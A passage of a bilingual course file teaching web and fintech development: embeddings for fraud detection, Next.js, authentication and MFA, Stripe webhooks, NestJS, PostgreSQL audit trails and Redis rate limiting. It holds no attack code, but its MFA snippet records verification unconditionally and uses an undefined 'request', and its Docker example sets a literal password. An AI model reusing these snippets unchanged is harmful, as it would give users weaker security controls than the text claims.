| **Pinecone** | Cloud | Production |
| **Supabase pgvector** | Cloud | Full-stack |
| **ChromaDB** | Local | Development |

---

## 🎯 Real Case: Anomaly Detection

Embeddings are ideal for detecting unusual behavior in fintech.

### Example: Suspicious Transactions

\`\`\`typescript
// Vectorize the user's "normal" behavior
const normalProfile = await embedTransaction({
  averageAmount: 150,
  usualHours: '9am-6pm',
  locations: ['New York', 'Boston'],
  frequentMerchants: ['Amazon', 'Uber', 'Starbucks']
})

// New transaction
const transaction = await embedTransaction({
  amount: 5000,
  time: '3:47am',
  location: 'Lagos, Nigeria',
  merchant: 'CryptoExchange_xyz'
})

// Calculate similarity
const similarity = cosineSimilarity(normalProfile, transaction)

if (similarity < 0.3) {
  await flagForReview(transaction) // 🚨 Manual review
  await notifyUser('We detected unusual activity')
}
\`\`\`

### Fintech Applications

| Case | Input | Output |
|------|-------|--------|
| **Fraud detection** | History + new transaction | Risk score 0-100 |
| **Credit scoring** | Profile data | Similarity to "good" profiles |
| **Automated KYC** | Documents + behavior | Identity match |
| **Segmentation** | User history | Behavior cluster |

> 💡 Embeddings capture patterns that traditional rules cannot detect.

---

## Practice

→ [Vector Search](/en/cooking/vector-search)

---

## Useful links

- 📖 [OpenAI Embeddings](https://platform.openai.com/docs/guides/embeddings)
- 📖 [Pinecone Docs](https://docs.pinecone.io/)
    `,
  },
  // ===== CHEF LEVEL =====
  nextjs: {
    contentEs: `
## React para producción

Next.js es el framework React para aplicaciones web completas.

---

## Por qué Next.js

| Feature | Beneficio |
|---------|-----------|
| **Server Components** | Menos JavaScript al cliente |
| **App Router** | Rutas basadas en carpetas |
| **SSR/SSG** | SEO y performance |
| **API Routes** | Backend integrado |

---

## Instalación

\`\`\`bash
npx create-next-app@latest mi-app --typescript --tailwind --app
cd mi-app
npm run dev
\`\`\`

---

## Estructura de carpetas

\`\`\`
app/
├── layout.tsx      # Layout global
├── page.tsx        # Página /
├── about/
│   └── page.tsx    # Página /about
├── api/
│   └── hello/
│       └── route.ts  # API endpoint
└── [slug]/
    └── page.tsx    # Ruta dinámica
\`\`\`

---

## Server vs Client Components

\`\`\`tsx
// Server Component (default)
async function ProductList() {
  const products = await db.products.findMany()
  return <ul>{products.map(p => <li key={p.id}>{p.name}</li>)}</ul>
}

// Client Component
'use client'
function Counter() {
  const [count, setCount] = useState(0)
  return <button onClick={() => setCount(count + 1)}>{count}</button>
}
\`\`\`

---

## API Routes

\`\`\`typescript
// app/api/users/route.ts
import { NextResponse } from 'next/server'

export async function GET() {
  return NextResponse.json({ users: [] })
}

export async function POST(request: Request) {
  const body = await request.json()
  return NextResponse.json({ created: body })
}
\`\`\`

---

## Practica

→ [Blog con Next.js + MDX](/es/cooking/nextjs-blog)
    `,
    contentEn: `
## React for production

Next.js is the React framework for complete web applications.

---

## Why Next.js

| Feature | Benefit |
|---------|---------|
| **Server Components** | Less JavaScript to client |
| **App Router** | Folder-based routes |
| **SSR/SSG** | SEO and performance |
| **API Routes** | Integrated backend |

---

## Installation

\`\`\`bash
npx create-next-app@latest my-app --typescript --tailwind --app
cd my-app
npm run dev
\`\`\`

---

## Folder structure

\`\`\`
app/
├── layout.tsx      # Global layout
├── page.tsx        # Page /
├── about/
│   └── page.tsx    # Page /about
├── api/
│   └── hello/
│       └── route.ts  # API endpoint
└── [slug]/
    └── page.tsx    # Dynamic route
\`\`\`

---

## Server vs Client Components

\`\`\`tsx
// Server Component (default)
async function ProductList() {
  const products = await db.products.findMany()
  return <ul>{products.map(p => <li key={p.id}>{p.name}</li>)}</ul>
}

// Client Component
'use client'
function Counter() {
  const [count, setCount] = useState(0)
  return <button onClick={() => setCount(count + 1)}>{count}</button>
}
\`\`\`

---

## API Routes

\`\`\`typescript
// app/api/users/route.ts
import { NextResponse } from 'next/server'

export async function GET() {
  return NextResponse.json({ users: [] })
}

export async function POST(request: Request) {
  const body = await request.json()
  return NextResponse.json({ created: body })
}
\`\`\`

---

## Practice

→ [Blog with Next.js + MDX](/en/cooking/nextjs-blog)
    `,
  },
  auth: {
    contentEs: `
## Identidad y seguridad

La autenticación verifica quién eres. La autorización verifica qué puedes hacer.

---

## Métodos de autenticación

| Método | Cuándo usar |
|--------|-------------|
| **OAuth** | Login con Google, GitHub |
| **Email/Password** | Usuarios propios |
| **Magic Links** | Sin contraseñas |
| **JWT** | APIs stateless |

---

## OAuth 2.0 Flow

\`\`\`
Usuario → Tu app → Proveedor (Google)
                          ↓
Usuario ← Tu app ← Token + Info
\`\`\`

---

## JWT (JSON Web Tokens)

\`\`\`typescript
// Estructura: header.payload.signature
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

// Contenido (payload)
{
  "sub": "user123",
  "email": "user@email.com",
  "exp": 1699999999
}
\`\`\`

---

## Servicios recomendados

| Servicio | Tipo | Ideal para |
|----------|------|------------|
| **Firebase Auth** | BaaS | Apps móviles, web |
| **Supabase Auth** | BaaS | Full-stack |
| **Auth0** | SaaS | Enterprise |
| **NextAuth.js** | Library | Next.js apps |

---

## Seguridad básica

| Práctica | Por qué |
|----------|---------|
| HTTPS siempre | Encripta tráfico |
| Tokens cortos | Limita daño si roban |
| Refresh tokens | Renovar sin re-login |
| Rate limiting | Previene brute force |

---

## 🏦 Seguridad para Apps Financieras

Si tu app maneja dinero o datos financieros, necesitas medidas adicionales.

### Checklist Obligatorio

| Requisito | Por qué | Estándar |
|-----------|---------|----------|
| ✅ MFA obligatorio | Regulación PSD2/Open Banking | NIST 800-63B |
| ✅ Logs inmutables | Auditoría ante reguladores | SOC 2 |
| ✅ Encriptación en reposo | Datos sensibles protegidos | PCI DSS |
| ✅ Sesiones con timeout | Prevención de fraude | OWASP |
| ✅ Rate limiting agresivo | Anti-scraping financiero | - |

### ¿Qué es PCI DSS?

Si tu app procesa, almacena o transmite datos de tarjetas de pago, **debes** cumplir con PCI DSS.

| Nivel | Transacciones/año | Requisitos |
|-------|------------------|------------|
| 4 | < 20,000 | SAQ (Self-Assessment) |
| 3 | 20,000 - 1M | SAQ + escaneo trimestral |
| 2 | 1M - 6M | SAQ + auditoría |
| 1 | > 6M | Auditoría completa anual |

> 💡 **Tip**: Usa Stripe, PayPal o MercadoPago para evitar manejar datos de tarjeta directamente. Ellos asumen el compliance.

### Implementación MFA

\`\`\`typescript
// Verificar segundo factor antes de operaciones sensibles
async function requireMFA(userId: string, action: string) {
  const user = await getUser(userId)

  if (SENSITIVE_ACTIONS.includes(action) && !user.mfaVerifiedAt) {
    throw new Error('MFA_REQUIRED')
  }

  // Log para auditoría
  await auditLog({
    userId,
    action,
    mfaVerified: true,
    timestamp: new Date().toISOString(),
    ip: request.ip
  })
}

const SENSITIVE_ACTIONS = [
  'TRANSFER_FUNDS',
  'CHANGE_PASSWORD',
  'ADD_BENEFICIARY',
  'EXPORT_DATA'
]
\`\`\`

---

## Practica

→ [Auth con Firebase Google](/es/cooking/auth-firebase)
    `,
    contentEn: `
## Identity and security

Authentication verifies who you are. Authorization verifies what you can do.

---

## Authentication methods

| Method | When to use |
|--------|-------------|
| **OAuth** | Login with Google, GitHub |
| **Email/Password** | Own users |
| **Magic Links** | Passwordless |
| **JWT** | Stateless APIs |

---

## OAuth 2.0 Flow

\`\`\`
User → Your app → Provider (Google)
                        ↓
User ← Your app ← Token + Info
\`\`\`

---

## JWT (JSON Web Tokens)

\`\`\`typescript
// Structure: header.payload.signature
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

// Content (payload)
{
  "sub": "user123",
  "email": "user@email.com",
  "exp": 1699999999
}
\`\`\`

---

## Recommended services

| Service | Type | Ideal for |
|---------|------|-----------|
| **Firebase Auth** | BaaS | Mobile, web apps |
| **Supabase Auth** | BaaS | Full-stack |
| **Auth0** | SaaS | Enterprise |
| **NextAuth.js** | Library | Next.js apps |

---

## Basic security

| Practice | Why |
|----------|-----|
| HTTPS always | Encrypts traffic |
| Short tokens | Limits damage if stolen |
| Refresh tokens | Renew without re-login |
| Rate limiting | Prevents brute force |

---

## 🏦 Security for Financial Apps

If your app handles money or financial data, you need additional measures.

### Required Checklist

| Requirement | Why | Standard |
|-------------|-----|----------|
| ✅ Mandatory MFA | PSD2/Open Banking regulation | NIST 800-63B |
| ✅ Immutable logs | Regulatory audits | SOC 2 |
| ✅ Encryption at rest | Sensitive data protection | PCI DSS |
| ✅ Session timeout | Fraud prevention | OWASP |
| ✅ Aggressive rate limiting | Anti-scraping | - |

### What is PCI DSS?

If your app processes, stores or transmits payment card data, you **must** comply with PCI DSS.

| Level | Transactions/year | Requirements |
|-------|------------------|--------------|
| 4 | < 20,000 | SAQ (Self-Assessment) |
| 3 | 20,000 - 1M | SAQ + quarterly scan |
| 2 | 1M - 6M | SAQ + audit |
| 1 | > 6M | Full annual audit |

> 💡 **Tip**: Use Stripe, PayPal or similar to avoid handling card data directly. They assume the compliance burden.

### MFA Implementation

\`\`\`typescript
// Verify second factor before sensitive operations
async function requireMFA(userId: string, action: string) {
  const user = await getUser(userId)

  if (SENSITIVE_ACTIONS.includes(action) && !user.mfaVerifiedAt) {
    throw new Error('MFA_REQUIRED')
  }

  // Audit log
  await auditLog({
    userId,
    action,
    mfaVerified: true,
    timestamp: new Date().toISOString(),
    ip: request.ip
  })
}

const SENSITIVE_ACTIONS = [
  'TRANSFER_FUNDS',
  'CHANGE_PASSWORD',
  'ADD_BENEFICIARY',
  'EXPORT_DATA'
]
\`\`\`

---

## Practice

→ [Auth with Firebase Google](/en/cooking/auth-firebase)
    `,
  },
  webhooks: {
    contentEs: `
## Eventos en tiempo real

Los webhooks permiten que servicios te notifiquen cuando algo pasa.

---

## Cómo funcionan

\`\`\`
Evento en servicio externo
         ↓
POST a tu endpoint
         ↓
Tu código procesa
\`\`\`

---

## Ejemplo: Stripe webhook

\`\`\`typescript
// app/api/webhooks/stripe/route.ts
export async function POST(request: Request) {
  const body = await request.text()
  const signature = request.headers.get('stripe-signature')!

  const event = stripe.webhooks.constructEvent(
    body,
    signature,
    process.env.STRIPE_WEBHOOK_SECRET!
  )

  switch (event.type) {
    case 'payment_intent.succeeded':
      // Marcar orden como pagada
      break
    case 'customer.subscription.deleted':
      // Cancelar suscripción
      break
  }

  return new Response('OK')
}
\`\`\`

---

## Verificar firma

Siempre verifica que el webhook viene del servicio real:

\`\`\`typescript
import crypto from 'crypto'

function verifySignature(payload: string, signature: string, secret: string) {
  const expected = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex')

  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  )
}
\`\`\`

---

## Servicios con webhooks

- Stripe (pagos)
- GitHub (commits, PRs)
- Slack (mensajes)
- Twilio (SMS, llamadas)

---

## 🔐 Webhooks de Pago: Seguridad Crítica

Los webhooks de pago son el punto más vulnerable de tu aplicación. Un atacante puede simular un pago exitoso.

### Idempotencia: No proceses dos veces

Stripe puede reenviar el mismo webhook múltiples veces. Sin idempotencia, cobras/acreditas doble.

\`\`\`typescript
export async function POST(request: Request) {
  const event = await verifyAndParseWebhook(request)

  // ⚠️ CRÍTICO: Verificar si ya procesamos este evento
  const processed = await db.query(
    'SELECT 1 FROM processed_webhooks WHERE event_id = $1',
    [event.id]
  )

  if (processed.rows.length > 0) {
    // Ya procesado, responder OK sin hacer nada
    return new Response('Already processed', { status: 200 })
  }

  // Procesar el evento
  await processPaymentEvent(event)

  // Marcar como procesado DESPUÉS de procesar exitosamente
  await db.query(
    'INSERT INTO processed_webhooks (event_id, processed_at) VALUES ($1, NOW())',
    [event.id]
  )

  return new Response('OK')
}
\`\`\`

### Responde rápido, procesa después

Stripe espera respuesta en 20 segundos. Si tu procesamiento es lento, hazlo async:

\`\`\`typescript
export async function POST(request: Request) {
  const event = await verifyAndParseWebhook(request)

  // Responder inmediatamente
  // Procesar en background (cola, worker, etc.)
  await queue.add('process-payment', { eventId: event.id })

  return new Response('OK') // < 1 segundo
}
\`\`\`

### Errores comunes en Fintech

| Error | Consecuencia | Solución |
|-------|--------------|----------|
| No validar firma | Fraude: pagos falsos | \`constructEvent()\` siempre |
| No manejar duplicados | Cobro/acreditación doble | Tabla de idempotencia |
| Timeout en procesamiento | Stripe reintenta = duplicados | Responder rápido, procesar async |
| No loguear eventos | Imposible debuggear | Log completo con timestamp |

---

## Practica

→ [Receptor de Webhooks](/es/cooking/webhook-receiver)
    `,
    contentEn: `
## Real-time events

Webhooks allow services to notify you when something happens.

---

## How they work

\`\`\`
Event in external service
         ↓
POST to your endpoint
         ↓
Your code processes
\`\`\`

---

## Example: Stripe webhook

\`\`\`typescript
// app/api/webhooks/stripe/route.ts
export async function POST(request: Request) {
  const body = await request.text()
  const signature = request.headers.get('stripe-signature')!

  const event = stripe.webhooks.constructEvent(
    body,
    signature,
    process.env.STRIPE_WEBHOOK_SECRET!
  )

  switch (event.type) {
    case 'payment_intent.succeeded':
      // Mark order as paid
      break
    case 'customer.subscription.deleted':
      // Cancel subscription
      break
  }

  return new Response('OK')
}
\`\`\`

---

## Verify signature

Always verify the webhook comes from the real service:

\`\`\`typescript
import crypto from 'crypto'

function verifySignature(payload: string, signature: string, secret: string) {
  const expected = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex')

  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  )
}
\`\`\`

---

## Services with webhooks

- Stripe (payments)
- GitHub (commits, PRs)
- Slack (messages)
- Twilio (SMS, calls)

---

## 🔐 Payment Webhooks: Critical Security

Payment webhooks are the most vulnerable point of your application. An attacker can simulate a successful payment.

### Idempotency: Don't process twice

Stripe can resend the same webhook multiple times. Without idempotency, you charge/credit double.

\`\`\`typescript
export async function POST(request: Request) {
  const event = await verifyAndParseWebhook(request)

  // ⚠️ CRITICAL: Check if we already processed this event
  const processed = await db.query(
    'SELECT 1 FROM processed_webhooks WHERE event_id = $1',
    [event.id]
  )

  if (processed.rows.length > 0) {
    // Already processed, respond OK without doing anything
    return new Response('Already processed', { status: 200 })
  }

  // Process the event
  await processPaymentEvent(event)

  // Mark as processed AFTER successful processing
  await db.query(
    'INSERT INTO processed_webhooks (event_id, processed_at) VALUES ($1, NOW())',
    [event.id]
  )

  return new Response('OK')
}
\`\`\`

### Respond fast, process later

Stripe waits for response in 20 seconds. If your processing is slow, make it async:

\`\`\`typescript
export async function POST(request: Request) {
  const event = await verifyAndParseWebhook(request)

  // Respond immediately
  // Process in background (queue, worker, etc.)
  await queue.add('process-payment', { eventId: event.id })

  return new Response('OK') // < 1 second
}
\`\`\`

### Common Fintech Errors

| Error | Consequence | Solution |
|-------|-------------|----------|
| Not validating signature | Fraud: fake payments | \`constructEvent()\` always |
| Not handling duplicates | Double charge/credit | Idempotency table |
| Timeout in processing | Stripe retries = duplicates | Respond fast, process async |
| Not logging events | Impossible to debug | Full log with timestamp |

---

## Practice

→ [Webhook Receiver](/en/cooking/webhook-receiver)
    `,
  },
  nestjs: {
    contentEs: `
## APIs estructuradas

NestJS (Node) y FastAPI (Python) son frameworks para APIs robustas.

---

## NestJS (TypeScript)

\`\`\`bash
npm i -g @nestjs/cli
nest new mi-api
cd mi-api
npm run start:dev
\`\`\`

---

## Estructura NestJS

\`\`\`
src/
├── app.module.ts
├── users/
│   ├── users.controller.ts  # Endpoints
│   ├── users.service.ts     # Lógica
│   ├── users.module.ts      # Registro
│   └── dto/                 # Validación
\`\`\`

---

## Controller

\`\`\`typescript
@Controller('users')
export class UsersController {
  constructor(private usersService: UsersService) {}

  @Get()
  findAll() {
    return this.usersService.findAll()
  }

  @Post()
  create(@Body() createUserDto: CreateUserDto) {
    return this.usersService.create(createUserDto)
  }
}
\`\`\`

---

## FastAPI (Python)

Ya lo vimos en el nivel Cocinero. Comparación:

| Aspecto | NestJS | FastAPI |
|---------|--------|---------|
| Lenguaje | TypeScript | Python |
| Estilo | OOP, decoradores | Funcional |
| Docs | Swagger manual | Auto /docs |
| Performance | Bueno | Excelente |

---

## Cuándo usar cada uno

- **NestJS**: Equipos grandes, microservicios
- **FastAPI**: IA/ML, prototipos rápidos
    `,
    contentEn: `
## Structured APIs

NestJS (Node) and FastAPI (Python) are frameworks for robust APIs.

---

## NestJS (TypeScript)

\`\`\`bash
npm i -g @nestjs/cli
nest new my-api
cd my-api
npm run start:dev
\`\`\`

---

## NestJS Structure

\`\`\`
src/
├── app.module.ts
├── users/
│   ├── users.controller.ts  # Endpoints
│   ├── users.service.ts     # Logic
│   ├── users.module.ts      # Registration
│   └── dto/                 # Validation
\`\`\`

---

## Controller

\`\`\`typescript
@Controller('users')
export class UsersController {
  constructor(private usersService: UsersService) {}

  @Get()
  findAll() {
    return this.usersService.findAll()
  }

  @Post()
  create(@Body() createUserDto: CreateUserDto) {
    return this.usersService.create(createUserDto)
  }
}
\`\`\`

---

## FastAPI (Python)

We saw it in the Cook level. Comparison:

| Aspect | NestJS | FastAPI |
|--------|--------|---------|
| Language | TypeScript | Python |
| Style | OOP, decorators | Functional |
| Docs | Manual Swagger | Auto /docs |
| Performance | Good | Excellent |

---

## When to use each

- **NestJS**: Large teams, microservices
- **FastAPI**: AI/ML, fast prototypes
    `,
  },
  postgresql: {
    contentEs: `
## Base de datos relacional

PostgreSQL es la base de datos open source más avanzada.

---

## Instalación

\`\`\`bash
# macOS
brew install postgresql@16
brew services start postgresql@16

# Docker
docker run -d --name pg -e POSTGRES_PASSWORD=secret -p 5432:5432 postgres:16
\`\`\`

---

## Conectar

\`\`\`bash
psql -U postgres
# o con Docker
docker exec -it pg psql -U postgres
\`\`\`

---

## SQL básico

\`\`\`sql
-- Crear tabla
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  name VARCHAR(100),
  created_at TIMESTAMP DEFAULT NOW()
);

-- Insertar
INSERT INTO users (email, name) VALUES ('ana@email.com', 'Ana');

-- Consultar
SELECT * FROM users WHERE email LIKE '%@email.com';

-- Actualizar
UPDATE users SET name = 'Ana García' WHERE id = 1;

-- Eliminar
DELETE FROM users WHERE id = 1;
\`\`\`

---

## ORMs recomendados

| ORM | Lenguaje |
|-----|----------|
| **Prisma** | TypeScript |
| **Drizzle** | TypeScript |
| **SQLAlchemy** | Python |

---

## Prisma ejemplo

\`\`\`typescript
const user = await prisma.user.create({
  data: { email: 'ana@email.com', name: 'Ana' }
})

const users = await prisma.user.findMany({
  where: { email: { contains: '@email.com' } }
})
\`\`\`

---

## 🏦 Caso Fintech: Audit Trail y Encriptación

Las regulaciones financieras (PCI DSS, SOC 2) requieren registrar TODAS las operaciones. PostgreSQL tiene herramientas nativas para esto:

### Tabla de auditoría

\`\`\`sql
-- Tabla de audit trail
CREATE TABLE audit_log (
  id BIGSERIAL PRIMARY KEY,
  table_name VARCHAR(100) NOT NULL,
  record_id VARCHAR(100) NOT NULL,
  action VARCHAR(20) NOT NULL, -- INSERT, UPDATE, DELETE
  old_data JSONB,
  new_data JSONB,
  changed_by VARCHAR(100),
  ip_address INET,
  user_agent TEXT,
  timestamp TIMESTAMPTZ DEFAULT NOW()
);

-- Índices para búsquedas rápidas de auditoría
CREATE INDEX idx_audit_table ON audit_log(table_name);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX idx_audit_user ON audit_log(changed_by);
\`\`\`

### Trigger automático

\`\`\`sql
-- Función de auditoría genérica
CREATE OR REPLACE FUNCTION audit_trigger_func()
RETURNS TRIGGER AS $$
BEGIN
  IF TG_OP = 'DELETE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, changed_by)
    VALUES (TG_TABLE_NAME, OLD.id::text, 'DELETE', row_to_json(OLD)::jsonb, current_setting('app.current_user', true));
    RETURN OLD;
  ELSIF TG_OP = 'UPDATE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id::text, 'UPDATE', row_to_json(OLD)::jsonb, row_to_json(NEW)::jsonb, current_setting('app.current_user', true));
    RETURN NEW;
  ELSIF TG_OP = 'INSERT' THEN
    INSERT INTO audit_log (table_name, record_id, action, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id::text, 'INSERT', row_to_json(NEW)::jsonb, current_setting('app.current_user', true));
    RETURN NEW;
  END IF;
END;
$$ LANGUAGE plpgsql;

-- Aplicar a tablas sensibles
CREATE TRIGGER audit_transactions
AFTER INSERT OR UPDATE OR DELETE ON transactions
FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();

CREATE TRIGGER audit_users
AFTER INSERT OR UPDATE OR DELETE ON users
FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();
\`\`\`

### Encriptación de datos sensibles

\`\`\`sql
-- Usar pgcrypto para datos sensibles
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Tabla con datos encriptados
CREATE TABLE payment_methods (
  id SERIAL PRIMARY KEY,
  user_id INT REFERENCES users(id),
  card_last_four VARCHAR(4), -- Solo últimos 4 dígitos (visible)
  card_token_encrypted BYTEA, -- Token encriptado
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insertar con encriptación
INSERT INTO payment_methods (user_id, card_last_four, card_token_encrypted)
VALUES (
  1,
  '4242',
  pgp_sym_encrypt('tok_visa_4242', current_setting('app.encryption_key'))
);

-- Leer (solo con la llave correcta)
SELECT user_id, card_last_four,
       pgp_sym_decrypt(card_token_encrypted, current_setting('app.encryption_key')) as token
FROM payment_methods WHERE user_id = 1;
\`\`\`

### Consultas de auditoría para compliance

\`\`\`sql
-- Quién modificó este registro?
SELECT * FROM audit_log
WHERE table_name = 'transactions' AND record_id = '12345'
ORDER BY timestamp DESC;

-- Todas las acciones de un usuario (para investigación de fraude)
SELECT * FROM audit_log
WHERE changed_by = 'user@email.com'
AND timestamp > NOW() - INTERVAL '30 days';

-- Exportar para auditor externo
COPY (
  SELECT * FROM audit_log
  WHERE timestamp BETWEEN '2026-01-01' AND '2026-12-31'
) TO '/tmp/audit_2026.csv' CSV HEADER;
\`\`\`

> 💡 Un audit trail bien implementado en PostgreSQL cumple con PCI DSS Req. 10 y facilita auditorías SOC 2.

---

## Practica

→ [CRUD con PostgreSQL](/es/cooking/crud-postgres)
    `,
    contentEn: `
## Relational database

PostgreSQL is the most advanced open source database.

---

## Installation

\`\`\`bash
# macOS
brew install postgresql@16
brew services start postgresql@16

# Docker
docker run -d --name pg -e POSTGRES_PASSWORD=secret -p 5432:5432 postgres:16
\`\`\`

---

## Connect

\`\`\`bash
psql -U postgres
# or with Docker
docker exec -it pg psql -U postgres
\`\`\`

---

## Basic SQL

\`\`\`sql
-- Create table
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  name VARCHAR(100),
  created_at TIMESTAMP DEFAULT NOW()
);

-- Insert
INSERT INTO users (email, name) VALUES ('ana@email.com', 'Ana');

-- Query
SELECT * FROM users WHERE email LIKE '%@email.com';

-- Update
UPDATE users SET name = 'Ana García' WHERE id = 1;

-- Delete
DELETE FROM users WHERE id = 1;
\`\`\`

---

## Recommended ORMs

| ORM | Language |
|-----|----------|
| **Prisma** | TypeScript |
| **Drizzle** | TypeScript |
| **SQLAlchemy** | Python |

---

## Prisma example

\`\`\`typescript
const user = await prisma.user.create({
  data: { email: 'ana@email.com', name: 'Ana' }
})

const users = await prisma.user.findMany({
  where: { email: { contains: '@email.com' } }
})
\`\`\`

---

## 🏦 Fintech Case: Audit Trail and Encryption

Financial regulations (PCI DSS, SOC 2) require logging ALL operations. PostgreSQL has native tools for this:

### Audit table

\`\`\`sql
-- Audit trail table
CREATE TABLE audit_log (
  id BIGSERIAL PRIMARY KEY,
  table_name VARCHAR(100) NOT NULL,
  record_id VARCHAR(100) NOT NULL,
  action VARCHAR(20) NOT NULL, -- INSERT, UPDATE, DELETE
  old_data JSONB,
  new_data JSONB,
  changed_by VARCHAR(100),
  ip_address INET,
  user_agent TEXT,
  timestamp TIMESTAMPTZ DEFAULT NOW()
);

-- Indexes for fast audit queries
CREATE INDEX idx_audit_table ON audit_log(table_name);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
CREATE INDEX idx_audit_user ON audit_log(changed_by);
\`\`\`

### Automatic trigger

\`\`\`sql
-- Generic audit function
CREATE OR REPLACE FUNCTION audit_trigger_func()
RETURNS TRIGGER AS $$
BEGIN
  IF TG_OP = 'DELETE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, changed_by)
    VALUES (TG_TABLE_NAME, OLD.id::text, 'DELETE', row_to_json(OLD)::jsonb, current_setting('app.current_user', true));
    RETURN OLD;
  ELSIF TG_OP = 'UPDATE' THEN
    INSERT INTO audit_log (table_name, record_id, action, old_data, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id::text, 'UPDATE', row_to_json(OLD)::jsonb, row_to_json(NEW)::jsonb, current_setting('app.current_user', true));
    RETURN NEW;
  ELSIF TG_OP = 'INSERT' THEN
    INSERT INTO audit_log (table_name, record_id, action, new_data, changed_by)
    VALUES (TG_TABLE_NAME, NEW.id::text, 'INSERT', row_to_json(NEW)::jsonb, current_setting('app.current_user', true));
    RETURN NEW;
  END IF;
END;
$$ LANGUAGE plpgsql;

-- Apply to sensitive tables
CREATE TRIGGER audit_transactions
AFTER INSERT OR UPDATE OR DELETE ON transactions
FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();

CREATE TRIGGER audit_users
AFTER INSERT OR UPDATE OR DELETE ON users
FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();
\`\`\`

### Sensitive data encryption

\`\`\`sql
-- Use pgcrypto for sensitive data
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Table with encrypted data
CREATE TABLE payment_methods (
  id SERIAL PRIMARY KEY,
  user_id INT REFERENCES users(id),
  card_last_four VARCHAR(4), -- Only last 4 digits (visible)
  card_token_encrypted BYTEA, -- Encrypted token
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insert with encryption
INSERT INTO payment_methods (user_id, card_last_four, card_token_encrypted)
VALUES (
  1,
  '4242',
  pgp_sym_encrypt('tok_visa_4242', current_setting('app.encryption_key'))
);

-- Read (only with correct key)
SELECT user_id, card_last_four,
       pgp_sym_decrypt(card_token_encrypted, current_setting('app.encryption_key')) as token
FROM payment_methods WHERE user_id = 1;
\`\`\`

### Audit queries for compliance

\`\`\`sql
-- Who modified this record?
SELECT * FROM audit_log
WHERE table_name = 'transactions' AND record_id = '12345'
ORDER BY timestamp DESC;

-- All actions by a user (for fraud investigation)
SELECT * FROM audit_log
WHERE changed_by = 'user@email.com'
AND timestamp > NOW() - INTERVAL '30 days';

-- Export for external auditor
COPY (
  SELECT * FROM audit_log
  WHERE timestamp BETWEEN '2026-01-01' AND '2026-12-31'
) TO '/tmp/audit_2026.csv' CSV HEADER;
\`\`\`

> 💡 A well-implemented audit trail in PostgreSQL complies with PCI DSS Req. 10 and facilitates SOC 2 audits.

---

## Practice

→ [CRUD with PostgreSQL](/en/cooking/crud-postgres)
    `,
  },
  redis: {
    contentEs: `
## Cache y datos en memoria

Redis guarda datos en RAM para acceso ultra-rápido.

---

## Casos de uso

| Uso | Por qué Redis |
|-----|---------------|
| **Cache** | Evitar queries lentas |
| **Sessions** | Estado de usuario |
| **Rate limiting** | Contar requests |
| **Queues** | Jobs en background |

---

## Instalación

\`\`\`bash
# macOS
brew install redis
brew services start redis

# Docker
docker run -d --name redis -p 6379:6379 redis:7
\`\`\`

---

## Comandos básicos

\`\`\`bash
redis-cli

# Strings
SET user:1 "Ana"
GET user:1
SETEX token:abc 3600 "data"  # Expira en 1 hora

# Contadores
INCR page:views
INCRBY api:calls 10

# Hashes
HSET user:1 name "Ana" email "ana@email.com"
HGETALL user:1
\`\`\`

---

## Con Node.js

\`\`\`typescript
import { Redis } from 'ioredis'

const redis = new Redis()

// Cache
async function getUser(id: string) {
  const cached = await redis.get(\`user:\${id}\`)
  if (cached) return JSON.parse(cached)

  const user = await db.users.findUnique({ where: { id } })
  await redis.setex(\`user:\${id}\`, 3600, JSON.stringify(user))
  return user
}
\`\`\`

---

## 🏦 Caso Fintech: Rate Limiting para APIs

Las APIs financieras son objetivo de ataques de fuerza bruta y abuso. Redis es perfecto para implementar **rate limiting** robusto:

\`\`\`typescript
import { Redis } from 'ioredis'

const redis = new Redis()

// Sliding window rate limiter
async function checkRateLimit(userId: string, action: string): Promise<boolean> {
  const key = \`ratelimit:\${action}:\${userId}\`
  const now = Date.now()
  const windowMs = 60000 // 1 minuto

  // Límites por acción (más estrictos para operaciones sensibles)
  const limits: Record<string, number> = {
    'transfer': 5,      // 5 transferencias/min
    'login': 10,        // 10 intentos/min
    'api_call': 100,    // 100 llamadas/min
    'otp_request': 3,   // 3 códigos OTP/min
  }

  const limit = limits[action] || 60

  // Sliding window con sorted sets
  await redis.zremrangebyscore(key, 0, now - windowMs)
  const count = await redis.zcard(key)

  if (count >= limit) {
    // Log intento bloqueado para análisis de seguridad
    await redis.lpush('security:blocked_requests', JSON.stringify({
      userId, action, timestamp: now, count
    }))
    return false // Bloqueado
  }

  await redis.zadd(key, now, \`\${now}\`)
  await redis.expire(key, 60)
  return true // Permitido
}

// Middleware para Express/Fastify
async function rateLimitMiddleware(req, res, next) {
  const userId = req.user?.id || req.ip
  const allowed = await checkRateLimit(userId, 'api_call')

  if (!allowed) {
    // Headers estándar de rate limiting
    res.set('Retry-After', '60')
    res.set('X-RateLimit-Limit', '100')
    res.set('X-RateLimit-Remaining', '0')
    return res.status(429).json({ error: 'Too many requests' })
  }

  next()
}
\`\`\`

### Estrategias según operación

| Operación | Límite | Ventana | Acción si excede |
|-----------|--------|---------|------------------|
| Login fallido | 5 | 15 min | Bloqueo temporal + alerta |
